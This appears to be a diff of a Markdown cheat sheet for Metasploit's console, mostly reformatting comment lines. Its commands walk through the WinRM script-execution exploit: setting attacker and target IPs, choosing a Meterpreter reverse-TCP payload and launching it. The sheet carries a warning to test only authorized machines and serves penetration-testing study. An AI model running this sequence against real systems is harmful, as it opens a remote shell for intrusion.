@@ -12,85 +12,85 @@ This document contains terminal-based commands and usage examples for Metasploit
 msfconsole
 ```
 
-# Purpose:
-# Starts the Metasploit interactive console.
-# Note: Ensure Metasploit is installed (typically at /usr/share/metasploit-framework)
+- Purpose:
+- Starts the Metasploit interactive console.
+- Note: Ensure Metasploit is installed (typically at /usr/share/metasploit-framework)
 
 # Show Available Payloads
 ```
 show payloads
 ```
-# Purpose:
-# Lists all available payloads in the current module context.
-# Example: windows/meterpreter/reverse_tcp
+- Purpose:
+- Lists all available payloads in the current module context.
+- Example: windows/meterpreter/reverse_tcp
 
 # Show Available Exploits
 ```
 show exploits
 ```
-# Purpose:
-# Lists all exploit modules.
-# Note: 'show exploit' (singular) may work on older versions,
-# but 'show exploits' is standard and preferred.
+- Purpose:
+- Lists all exploit modules.
+- Note: 'show exploit' (singular) may work on older versions,
+- but 'show exploits' is standard and preferred.
 
 # Select WinRM Exploit
 ```
 use exploit/windows/winrm/winrm_script_exec
 ```
 
-# Purpose:
-# Selects the WinRM Script Execution exploit for Windows systems.
-# Location: /usr/share/metasploit-framework/modules/exploits/windows/winrm/
+- Purpose:
+- Selects the WinRM Script Execution exploit for Windows systems.
+- Location: /usr/share/metasploit-framework/modules/exploits/windows/winrm/
 
 # Show Exploit Information
 ```
 show info
 ```
 
-# Purpose:
-# Displays detailed information about the selected exploit,
-# including author, platform, references, and payloads supported.
+- Purpose:
+- Displays detailed information about the selected exploit,
+- including author, platform, references, and payloads supported.
 
 # Show Exploit Options
 ```
 show options
 ```
-# Purpose:
-# Displays required and optional configuration values
-# such as RHOSTS (target IP) and LHOST (attacker IP).
+- Purpose:
+- Displays required and optional configuration values
+- such as RHOSTS (target IP) and LHOST (attacker IP).
 
 # Set Local Host IP
 ```
 set LHOST 192.<local_ip>
 ```
-# Purpose:
-# Specifies attacker's IP address for reverse connections.
-# Replace <local_ip> with actual IP (use `ip a` or `ifconfig` to find it).
+- Purpose:
+- Specifies attacker's IP address for reverse connections.
+- Replace <local_ip> with actual IP (use `ip a` or `ifconfig` to find it).
 
 # Set Remote Host IP
 ```
 set RHOST 192.<target_ip>
 ```
-# Purpose:
-# Sets the target system's IP address.
-# Replace <target_ip> with the actual IP of the system being tested.
-# Warning: Only test machines you are authorized to assess.
+- Purpose:
+- Sets the target system's IP address.
+- Replace <target_ip> with the actual IP of the system being tested.
+- Warning: Only test machines you are authorized to assess.
 
 # Set Payload
 ```
 set PAYLOAD windows/meterpreter/reverse_tcp
 ```
-# Purpose:
-# Defines the payload used during exploitation.
-# Must be compatible with the chosen exploit.
+- Purpose:
+- Defines the payload used during exploitation.
+- Must be compatible with the chosen exploit.
 
 # Launch the Exploit
 ```
 exploit
 ```
-# Purpose:
-# Executes the configured exploit with the selected options and payload.
-# You may also use 'run' as an alias.
+- Purpose:
+- Executes the configured exploit with the selected options and payload.
+- You may also use 'run' as an alias.
 
 ```
 msfconsole
@@ -105,7 +105,7 @@ msf6 exploit(windows/winrm/winrm_script_exec) > exploit
 ```
 ### best practice
 
-
+```
 # Ensure Exploit Compatibility
 # - Use 'show info' to confirm the exploit matches the target system.
 
@@ -122,3 +122,4 @@ msfupdate
 ```
 # Choose Payloads Wisely
 # - Use 'show payloads' to find compatible ones for the exploit.
+```
